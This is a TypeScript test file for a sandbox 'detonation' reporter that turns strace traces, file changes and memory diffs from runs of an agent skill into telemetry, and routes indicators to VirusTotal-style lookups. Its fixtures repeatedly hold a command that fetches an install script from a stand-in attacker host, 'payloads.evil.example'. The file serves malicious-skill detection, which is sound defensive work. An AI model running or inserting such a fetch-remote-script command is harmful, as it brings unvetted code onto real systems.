import assert from "node:assert/strict";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

import type { PromptRunnerResult } from "./prompt-runner.js";
import {
  buildDetonationReportFromPromptRunner,
  enrichDetonationTelemetryIndicators,
} from "./telemetry.js";

test("buildDetonationReportFromPromptRunner captures trace telemetry and persists artifacts", async () => {
  const artifactsRoot = await mkdtemp(path.join(tmpdir(), "clawguard-telemetry-test-"));

  try {
    const result: PromptRunnerResult = {
      request: {
        requestId: "req-telemetry",
        snapshot: {
          slug: "fixture-skill",
          path: "/tmp/fixture",
          sourceHints: [{ kind: "fixture", detail: "test" }],
          contentHash: "sha256:test",
          fileInventory: ["SKILL.md"],
          detectedAt: new Date(0).toISOString(),
        },
        prompts: ["run sample"],
        timeoutSeconds: 60,
      },
      plan: {
        requestId: "req-telemetry",
        promptCount: 1,
        setupCommandCount: 0,
        steps: [],
      },
      execution: [
        {
          stepId: "prompt-1",
          type: "prompt",
          intent: "execute-workflow",
          executor: "prompt-harness",
          status: "completed",
          value: "Run workflow",
          command: "node",
          args: ["harness.mjs"],
          startedAt: new Date().toISOString(),
          completedAt: new Date().toISOString(),
          result: {
            exitCode: 0,
            stdout: "",
            stderr: "",
          },
        },
      ],
      memoryDiffs: [
        {
          name: "memory",
          changed: true,
          baselineHash: "sha256:before",
          currentHash: "sha256:after",
          baselineContent: "# MEMORY\nbefore\n",
          currentContent: "# MEMORY\nafter\n",
          diffText:
            "--- memory.before\n+++ memory.after\n@@\n-# MEMORY\n-before\n+# MEMORY\n+after",
        },
        {
          name: "soul",
          changed: false,
          baselineHash: "sha256:soul",
          currentHash: "sha256:soul",
          baselineContent: "",
          currentContent: "",
          diffText: "",
        },
        {
          name: "user",
          changed: false,
          baselineHash: "sha256:user",
          currentHash: "sha256:user",
          baselineContent: "",
          currentContent: "",
          diffText: "",
        },
      ],
      fileChanges: [
        {
          path: "/workspace/openclaw/skills/fixture-skill/install.sh",
          kind: "created",
          currentHash: "sha256:payload",
          currentContent: "curl https://payloads.evil.example/install.sh",
          diffText:
            "--- install.before\n+++ install.after\n@@\n+curl https://payloads.evil.example/install.sh",
        },
      ],
      stepTraces: [
        {
          stepId: "prompt-1",
          files: [
            {
              filename: "prompt-1.trace.1000",
              content: [
                '12:00:00.000000 execve("/usr/bin/curl", ["curl", "https://payloads.evil.example/install.sh"], 0x0) = 0',
                '12:00:00.100000 connect(3<socket:[123]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0',
                '12:00:00.200000 openat(AT_FDCWD, "/workspace/openclaw/skills/fixture-skill/install.sh", O_RDONLY) = 3',
              ].join("\n"),
            },
          ],
        },
      ],
    };

    const built = await buildDetonationReportFromPromptRunner(result, {
      artifactsRoot,
    });

    assert.ok(built.telemetry.some((event) => event.type === "process" && event.process));
    assert.ok(built.telemetry.some((event) => event.type === "network" && event.network));
    assert.ok(built.telemetry.some((event) => event.type === "memory" && event.memory));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "detonation-trace"));
    assert.ok(built.artifacts.some((artifact) => artifact.type === "memory-diff"));

    const telemetryArtifact = built.artifacts.find((artifact) => artifact.type === "report-json");
    assert.ok(telemetryArtifact);
    const telemetryJson = await readFile(telemetryArtifact.path, "utf8");
    assert.match(telemetryJson, /93\.184\.216\.34/u);
    assert.match(telemetryJson, /sha256:payload/u);
  } finally {
    await rm(artifactsRoot, { recursive: true, force: true });
  }
});

test("enrichDetonationTelemetryIndicators dedupes and routes file, url, domain, and ip lookups", async () => {
  const verdicts = await enrichDetonationTelemetryIndicators(
    [
      {
        eventId: "evt-1",
        type: "process",
        detail: "Executed curl https://payloads.evil.example/install.sh",
        observedAt: new Date().toISOString(),
        process: {
          command: "/usr/bin/curl",
          args: ["curl", "https://payloads.evil.example/install.sh"],
          exitCode: 0,
        },
      },
      {
        eventId: "evt-2",
        type: "network",
        detail: "Connected to 93.184.216.34:443/tcp",
        observedAt: new Date().toISOString(),
        network: {
          protocol: "tcp",
          address: "93.184.216.34",
          port: 443,
        },
      },
      {
        eventId: "evt-3",
        type: "file",
        detail: "created /workspace/openclaw/skills/fixture-skill/install.sh",
        observedAt: new Date().toISOString(),
        file: {
          operation: "create",
          path: "/workspace/openclaw/skills/fixture-skill/install.sh",
          contentHash: "sha256:payload",
        },
      },
    ],
    {
      async getFileVerdict(contentHash: string) {
        return {
          provider: "virustotal",
          subjectType: "file",
          subject: contentHash,
          verdict: "review",
          summary: "file flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async getUrlVerdict(url: string) {
        return {
          provider: "virustotal",
          subjectType: "url",
          subject: url,
          verdict: "review",
          summary: "url flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async getDomainVerdict(domain: string) {
        return {
          provider: "virustotal",
          subjectType: "domain",
          subject: domain,
          verdict: "review",
          summary: "domain flagged",
          observedAt: new Date().toISOString(),
        };
      },
      async searchIndicators(query: string) {
        return {
          verdicts: [
            {
              provider: "virustotal",
              subjectType: "ip",
              subject: query.replace(/^ip:/u, ""),
              verdict: "review",
              summary: "ip flagged",
              observedAt: new Date().toISOString(),
            },
          ],
        };
      },
    },
  );

  assert.equal(
    verdicts.some((verdict) => verdict.subjectType === "file"),
    true,
  );
  assert.equal(
    verdicts.some((verdict) => verdict.subjectType === "url"),
    true,
  );
  assert.equal(
    verdicts.some((verdict) => verdict.subjectType === "domain"),
    true,
  );
  assert.equal(
    verdicts.some((verdict) => verdict.subjectType === "ip"),
    true,
  );
});

function makeMinimalResult(stepId: string, traceContent: string): PromptRunnerResult {
  return {
    request: {
      requestId: "req-unit",
      snapshot: {
        slug: "unit-skill",
        path: "/tmp/unit",
        sourceHints: [],
        contentHash: "sha256:unit",
        fileInventory: [],
        detectedAt: new Date(0).toISOString(),
      },
      prompts: ["run"],
      timeoutSeconds: 30,
    },
    plan: { requestId: "req-unit", promptCount: 1, setupCommandCount: 0, steps: [] },
    execution: [
      {
        stepId,
        type: "prompt",
        intent: "execute-workflow",
        executor: "prompt-harness",
        status: "completed",
        value: "run",
        command: "node",
        args: ["harness.mjs"],
        startedAt: new Date().toISOString(),
        completedAt: new Date().toISOString(),
        result: { exitCode: 0, stdout: "", stderr: "" },
      },
    ],
    memoryDiffs: [],
    fileChanges: [],
    stepTraces: [
      {
        stepId,
        files: [{ filename: `${stepId}.trace.1000`, content: traceContent }],
      },
    ],
  };
}

test("buildDetonationReportFromPromptRunner deduplicates argv[0] in process event details", async () => {
  const result = makeMinimalResult(
    "prompt-1",
    'execve("/usr/bin/curl", ["curl", "https://example.com/file"], 0x0) = 0',
  );

  const built = await buildDetonationReportFromPromptRunner(result);
  const processEvent = built.telemetry.find((e) => e.type === "process" && e.process);
  assert.ok(processEvent, "expected a process event");
  assert.equal(
    processEvent.detail,
    "Executed /usr/bin/curl https://example.com/file",
    "command path and argv[0] should not both appear",
  );
  assert.ok(
    built.report.triggeredActions.some((a) => a === "/usr/bin/curl https://example.com/file"),
    "triggeredActions should also deduplicate argv[0]",
  );
});

test("buildDetonationReportFromPromptRunner suppresses execution-record process events for traced steps", async () => {
  const result = makeMinimalResult(
    "prompt-1",
    'execve("/usr/bin/curl", ["curl", "https://example.com/payload"], 0x0) = 0',
  );

  const built = await buildDetonationReportFromPromptRunner(result);
  const processEvents = built.telemetry.filter((e) => e.type === "process");
  const [processEvent] = processEvents;
  assert.equal(
    processEvents.length,
    1,
    "only one process event expected (from trace, not harness)",
  );
  assert.ok(processEvent?.process);
  assert.equal(processEvent.process.command, "/usr/bin/curl");
  assert.ok(
    !built.report.triggeredActions.some((a) => a.includes("node harness")),
    "harness command should not appear in triggeredActions",
  );
});

test("buildDetonationReportFromPromptRunner parses connect with trailing strace timing annotations", async () => {
  const result = makeMinimalResult(
    "prompt-1",
    'connect(3<socket:[123]>, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = 0 <0.000123>',
  );

  const built = await buildDetonationReportFromPromptRunner(result);
  const networkEvent = built.telemetry.find((e) => e.type === "network");
  assert.ok(networkEvent, "expected a network event even with trailing timing annotation");
  assert.ok(networkEvent.network);
  assert.equal(networkEvent.network.address, "93.184.216.34");
  assert.equal(networkEvent.network.port, 443);
});

test("buildDetonationReportFromPromptRunner detects UDP protocol from fd annotation", async () => {
  const result = makeMinimalResult(
    "prompt-1",
    'connect(3<UDP:[123]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 0',
  );

  const built = await buildDetonationReportFromPromptRunner(result);
  const networkEvent = built.telemetry.find((e) => e.type === "network");
  assert.ok(networkEvent, "expected a network event");
  assert.ok(networkEvent.network);
  assert.equal(networkEvent.network.protocol, "udp");
  assert.equal(networkEvent.network.address, "8.8.8.8");
  assert.equal(networkEvent.network.port, 53);
});

test("buildDetonationReportFromPromptRunner decodes hex and octal escape sequences in execve args", async () => {
  const result = makeMinimalResult(
    "prompt-1",
    'execve("/usr/bin/printf", ["printf", "hello\\x1b[31mworld\\r\\n"], 0x0) = 0',
  );

  const built = await buildDetonationReportFromPromptRunner(result);
  const processEvent = built.telemetry.find((e) => e.type === "process" && e.process);
  assert.ok(processEvent, "expected a process event");
  assert.ok(processEvent.process);
  const secondArg = processEvent.process.args[1];
  assert.ok(secondArg?.includes("\x1b[31m"), "hex escape \\x1b should be decoded");
  assert.ok(secondArg?.includes("\r\n"), "\\r and \\n should be decoded");
});
